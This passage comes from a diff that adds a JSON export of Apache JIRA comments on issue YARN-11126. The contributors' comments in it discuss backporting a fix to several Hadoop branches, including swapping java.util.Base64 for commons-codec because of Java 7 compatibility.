+            "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=snemeth&avatarId=33743",
+            "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=snemeth&avatarId=33743"
+          },
+          "displayName": "Szilard Nemeth",
+          "active": true,
+          "timeZone": "Europe/Budapest"
+        },
+        "created": "2022-05-12T11:43:31.540+0000",
+        "updated": "2022-05-12T11:43:31.540+0000"
+      },
+      {
+        "self": "https://issues.apache.org/jira/rest/api/2/issue/13443379/comment/17538715",
+        "id": "17538715",
+        "author": {
+          "self": "https://issues.apache.org/jira/rest/api/2/user?username=tdomok",
+          "name": "tdomok",
+          "key": "tdomok",
+          "avatarUrls": {
+            "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=tdomok&avatarId=47196",
+            "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=tdomok&avatarId=47196",
+            "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=tdomok&avatarId=47196",
+            "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=tdomok&avatarId=47196"
+          },
+          "displayName": "Tamas Domok",
+          "active": true,
+          "timeZone": "Etc/UTC"
+        },
+        "body": "I created two PRs for branch-3.3 and branch-3.2.",
+        "updateAuthor": {
+          "self": "https://issues.apache.org/jira/rest/api/2/user?username=tdomok",
+          "name": "tdomok",
+          "key": "tdomok",
+          "avatarUrls": {
+            "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=tdomok&avatarId=47196",
+            "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=tdomok&avatarId=47196",
+            "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=tdomok&avatarId=47196",
+            "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=tdomok&avatarId=47196"
+          },
+          "displayName": "Tamas Domok",
+          "active": true,
+          "timeZone": "Etc/UTC"
+        },
+        "created": "2022-05-18T10:20:55.638+0000",
+        "updated": "2022-05-18T10:20:55.638+0000"
+      },
+      {
+        "self": "https://issues.apache.org/jira/rest/api/2/issue/13443379/comment/17541257",
+        "id": "17541257",
+        "author": {
+          "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+          "name": "iwasakims",
+          "key": "iwasakims",
+          "avatarUrls": {
+            "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+            "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+            "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+            "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+          },
+          "displayName": "Masatake Iwasaki",
+          "active": true,
+          "timeZone": "Asia/Tokyo"
+        },
+        "body": "cherry-picked this (and HADOOP-15261 as dependency) to branch-2.10.",
+        "updateAuthor": {
+          "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+          "name": "iwasakims",
+          "key": "iwasakims",
+          "avatarUrls": {
+            "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+            "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+            "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+            "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+          },
+          "displayName": "Masatake Iwasaki",
+          "active": true,
+          "timeZone": "Asia/Tokyo"
+        },
+        "created": "2022-05-24T04:21:54.445+0000",
+        "updated": "2022-05-24T04:21:54.445+0000"
+      },
+      {
+        "self": "https://issues.apache.org/jira/rest/api/2/issue/13443379/comment/17541261",
+        "id": "17541261",
+        "author": {
+          "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+          "name": "iwasakims",
+          "key": "iwasakims",
+          "avatarUrls": {
+            "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+            "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+            "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+            "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+          },
+          "displayName": "Masatake Iwasaki",
+          "active": true,
+          "timeZone": "Asia/Tokyo"
+        },
+        "body": "Oops. Base64 is not available in Java 7. I reverted this once.",
+        "updateAuthor": {
+          "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+          "name": "iwasakims",
+          "key": "iwasakims",
+          "avatarUrls": {
+            "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+            "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+            "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+            "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+          },
+          "displayName": "Masatake Iwasaki",
+          "active": true,
+          "timeZone": "Asia/Tokyo"
+        },
+        "created": "2022-05-24T04:29:59.532+0000",
+        "updated": "2022-05-24T04:29:59.532+0000"
+      },
+      {
+        "self": "https://issues.apache.org/jira/rest/api/2/issue/13443379/comment/17541268",
+        "id": "17541268",
+        "author": {
+          "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+          "name": "iwasakims",
+          "key": "iwasakims",
+          "avatarUrls": {
+            "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+            "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+            "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+            "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+          },
+          "displayName": "Masatake Iwasaki",
+          "active": true,
+          "timeZone": "Asia/Tokyo"
+        },
+        "body": "I pushed the backport to branch-2.10 again using org.apache.commons.codec.binary.Base64 instead of java.util.Base64.",
+        "updateAuthor": {
+          "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+          "name": "iwasakims",
+          "key": "iwasakims",
+          "avatarUrls": {
+            "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+            "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+            "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+            "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+          },
+          "displayName": "Masatake Iwasaki",
+          "active": true,
+          "timeZone": "Asia/Tokyo"
+        },
+        "created": "2022-05-24T05:03:21.642+0000",
+        "updated": "2022-05-24T05:03:21.642+0000"
+      },
+      {
+        "self": "https://issues.apache.org/jira/rest/api/2/issue/13443379/comment/17541281",
+        "id": "17541281",
+        "author": {
+          "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+          "name": "iwasakims",
+          "key": "iwasakims",
+          "avatarUrls": {
+            "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+            "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+            "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+            "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+          },
+          "displayName": "Masatake Iwasaki",
+          "active": true,
+          "timeZone": "Asia/Tokyo"
+        },
+        "body": "and to branch-2.10.2.",
+        "updateAuthor": {
+          "self": "https://issues.apache.org/jira/rest/api/2/user?username=iwasakims",
+          "name": "iwasakims",
+          "key": "iwasakims",
+          "avatarUrls": {
+            "48x48": "https://issues.apache.org/jira/secure/useravatar?ownerId=iwasakims&avatarId=38403",
+            "24x24": "https://issues.apache.org/jira/secure/useravatar?size=small&ownerId=iwasakims&avatarId=38403",
+            "16x16": "https://issues.apache.org/jira/secure/useravatar?size=xsmall&ownerId=iwasakims&avatarId=38403",
+            "32x32": "https://issues.apache.org/jira/secure/useravatar?size=medium&ownerId=iwasakims&avatarId=38403"
+          },
+          "displayName": "Masatake Iwasaki",
+          "active": true,
+          "timeZone": "Asia/Tokyo"
+        },
+        "created": "2022-05-24T05:49:40.149+0000",
+        "updated": "2022-05-24T05:49:40.149+0000"
+      }
+    ],
+    "pages": [
+      {
+        "url": "https://issues.apache.org/jira/rest/api/2/issue/YARN-11126/comment?startAt=0&maxResults=100",
+        "startAt": 0,
+        "maxResults": 100,
+        "total": 6,
+        "returned": 6
+      }
+    ]
+  }
+}
